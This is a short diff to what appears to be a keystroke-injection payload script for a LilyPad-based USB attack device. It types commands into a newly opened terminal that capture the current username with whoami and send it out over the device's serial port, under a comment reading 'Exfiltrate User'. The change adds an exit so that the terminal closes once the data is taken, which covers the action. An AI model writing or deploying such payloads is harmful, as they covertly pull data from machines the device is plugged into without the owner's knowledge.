@@ -6,7 +6,7 @@ CustomDelay:1000
 PrintLine:gnome-terminal
 CustomDelay:1000
 Rem: Exfiltrate User and BlinkLED:3 when done
-PrintLine:sleep .5;stty -F /dev/serial/by-id/*LilyPad* 38400;echo -e "SerialEXFIL:"$(whoami)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*
+PrintLine:sleep .5;stty -F /dev/serial/by-id/*LilyPad* 38400;echo -e "SerialEXFIL:"$(whoami)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*;exit
 Rem: -
 Rem: More examples below
 Rem: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
